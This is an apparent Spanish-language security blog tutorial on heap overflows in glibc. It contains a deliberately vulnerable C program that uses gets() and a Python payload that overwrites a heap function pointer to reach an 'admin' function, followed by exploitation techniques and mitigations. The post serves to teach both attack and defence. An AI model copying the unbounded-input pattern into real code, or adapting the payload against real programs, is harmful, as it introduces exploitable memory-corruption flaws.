---
title: "Heap overflow: cómo un simple desbordamiento destruye la memoria dinámica"
date: 2026-06-16
category: pwn
category_label: Pwn
ref: "2026-002"
difficulty: 3
tags: [heap, overflow, memory corruption, c, explotacion]
excerpt: "Explicación técnica de qué es un heap overflow, por qué es peligroso y cómo se explota, con código vulnerable en C y análisis paso a paso."
---

El heap overflow es una de las vulnerabilidades de corrupción de memoria más interesantes y complejas del mundo de la seguridad ofensiva. A diferencia del clásico stack overflow, aquí no sobreescribimos una dirección de retorno directamente — sobreescribimos **metadatos del gestor de memoria**, lo que abre la puerta a primitivas de escritura arbitraria mucho más sutiles.

Este post explica el concepto desde cero, con código vulnerable real y análisis del comportamiento en memoria.

## 1. Memoria dinámica: el heap

Cuando un programa reserva memoria en tiempo de ejecución con `malloc()`, `calloc()` o `new`, esa memoria viene del **heap** — una región de memoria gestionada por el allocator (en Linux, generalmente `ptmalloc2`, parte de glibc).

El allocator organiza la memoria en **chunks**. Cada chunk tiene esta estructura aproximada (en x86-64):

```
+------------------+
|   prev_size      |  8 bytes — tamaño del chunk anterior (si está libre)
+------------------+
|   size + flags   |  8 bytes — tamaño del chunk actual + bits de control
+------------------+
|   datos de       |
|   usuario        |  N bytes — lo que devuelve malloc()
+------------------+
```

Los **bits de control** en el campo `size` son especialmente importantes:
- **P (PREV_INUSE):** indica si el chunk anterior está en uso.
- **M (IS_MMAPED):** indica si el chunk fue creado con `mmap`.
- **A (NON_MAIN_ARENA):** indica si pertenece a una arena secundaria.

## 2. El código vulnerable

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char nombre[32];
    void (*saludar)(void);  // puntero a función
} Usuario;

void saludo_normal(void) {
    puts("[*] Hola, usuario.");
}

void saludo_admin(void) {
    puts("[!] Acceso de administrador concedido.");
    // en un escenario real: system("/bin/sh");
}

int main(void) {
    Usuario *u1 = malloc(sizeof(Usuario));
    Usuario *u2 = malloc(sizeof(Usuario));

    u1->saludar = saludo_normal;
    u2->saludar = saludo_normal;

    printf("Introduce tu nombre: ");
    // VULNERABILIDAD: no se limita la longitud de la entrada
    gets(u1->nombre);

    u1->saludar();
    u2->saludar();

    free(u1);
    free(u2);
    return 0;
}
```

El problema está en `gets(u1->nombre)` — `gets` no comprueba límites y escribe tantos bytes como el usuario introduzca. El campo `nombre` tiene 32 bytes, pero si introducimos más, sobreescribimos lo que venga después en el heap.

## 3. Qué hay después en el heap

Dos llamadas consecutivas a `malloc` reservan chunks contiguos en el heap. La distribución en memoria es aproximadamente esta:

```
[chunk u1]
  prev_size: 0x00
  size:      0x30 (48 bytes, con flag P activo)
  nombre:    [32 bytes] ← empezamos a escribir aquí
  saludar:   [8 bytes]  ← puntero a saludo_normal

[chunk u2]
  prev_size: 0x00
  size:      0x30
  nombre:    [32 bytes]
  saludar:   [8 bytes]  ← puntero a saludo_normal
```

Si introducimos más de 32 bytes, empezamos a sobreescribir `u1->saludar`. Si introducimos más de 40 bytes (32 + 8), sobreescribimos los **metadatos del chunk u2** y luego su contenido, incluyendo `u2->saludar`.

## 4. La explotación

El objetivo es hacer que `u2->saludar` apunte a `saludo_admin` en lugar de `saludo_normal`.

Necesitamos saber la dirección de `saludo_admin`. En un binario sin PIE (sin ASLR en el segmento de código) podemos obtenerla con:

```bash
$ nm ./vulnerable | grep saludo_admin
00000000004011d2 T saludo_admin
```

Construimos el payload:

```
[32 bytes para nombre de u1]
[8 bytes para sobreescribir saludar de u1]   ← no nos importa el valor
[8 bytes de prev_size del chunk u2]          ← cualquier cosa
[8 bytes de size del chunk u2]               ← cuidado: no romper el heap
[32 bytes para nombre de u2]                 ← relleno
[dirección de saludo_admin]                  ← sobreescribe u2->saludar
```

En Python:

```python
import struct

addr_admin = struct.pack("<Q", 0x4011d2)  # little-endian, 8 bytes

payload  = b"A" * 32          # llena nombre de u1
payload += b"B" * 8           # sobreescribe saludar de u1
payload += b"C" * 8           # prev_size de u2
payload += b"D" * 8           # size de u2
payload += b"E" * 32          # nombre de u2
payload += addr_admin          # sobreescribe saludar de u2

print(payload.decode("latin-1"))
```

Al ejecutar `u2->saludar()`, el programa salta a `saludo_admin`.

## 5. Por qué es más complejo que un stack overflow

En el stack overflow clásico sobreescribes la dirección de retorno directamente. En el heap la situación es más complicada por varios motivos:

- **El heap no es predecible:** la disposición de chunks depende del estado del allocator en ese momento. Un malloc previo puede cambiar todo.
- **Corromper metadatos del heap crashea el programa:** si tocas el campo `size` de un chunk y el valor no es válido, glibc lo detecta al hacer `free()` y aborta con "corrupted size vs. prev_size".
- **Mitigaciones modernas:** tcache poisoning, safe-linking (glibc >= 2.32), chunk size checks, etc. hacen que explotar heap overflows reales requiera técnicas adicionales.

## 6. Técnicas derivadas

Una vez conseguida una primitiva de escritura en heap, las técnicas de explotación más habituales son:

| Técnica | Descripción |
|---|---|
| **House of Force** | Sobreescribir el top chunk para controlar dónde asigna el siguiente malloc |
| **Unsafe unlink** | Aprovechar el proceso de coalescencia de chunks libres para escribir en un puntero arbitrario |
| **tcache poisoning** | Corromper el fd de un chunk en tcache para que el siguiente malloc devuelva una dirección arbitraria |
| **Fastbin dup** | Duplicar un chunk en la fastbin para controlar allocaciones futuras |

## 7. Mitigaciones y defensa

| Mitigación | Qué protege |
|---|---|
| **ASLR** | Aleatoriza las direcciones del heap, dificultando apuntar a targets fijos |
| **Safe-linking (glibc ≥ 2.32)** | Ofusca los punteros fd/bk de chunks libres |
| **Heap canaries** | Detectan sobreescrituras antes de free() |
| **AddressSanitizer (ASan)** | Detecta overflows en tiempo de ejecución durante desarrollo |
| **`-D_FORTIFY_SOURCE=2`** | Reemplaza funciones peligrosas como `gets` por versiones con límite |

La defensa más efectiva sigue siendo la misma de siempre: **no usar `gets`**, usar siempre `fgets` o `scanf` con límite, y validar longitudes antes de copiar datos en buffers.

## Conclusión

El heap overflow es una ventana directa a la gestión interna de memoria de un proceso. Entender cómo funciona el allocator es imprescindible tanto para explotarlo como para escribir código que no sea vulnerable. Las técnicas modernas de explotación de heap son complejas, pero todas parten del mismo principio: escribir más allá de un buffer para corromper estructuras de control que el programa usa sin sospechar.
